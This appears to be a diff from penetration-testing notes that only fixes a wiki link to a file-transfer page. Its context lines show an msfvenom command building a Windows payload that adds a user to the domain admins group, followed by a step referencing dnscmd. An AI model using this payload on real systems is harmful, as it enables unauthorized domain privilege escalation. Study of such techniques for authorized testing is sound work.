@@ -859,7 +859,7 @@ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain'
 > ```
 <!-- }}} -->
 
-3. [[Pentest/General/File Transfer/Windows/Download|Download]] the file to the target
+3. [[Pentest/File Transfer/Windows/Download|Download]] the file to the target
 
 
 4. [dnscmd](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) —
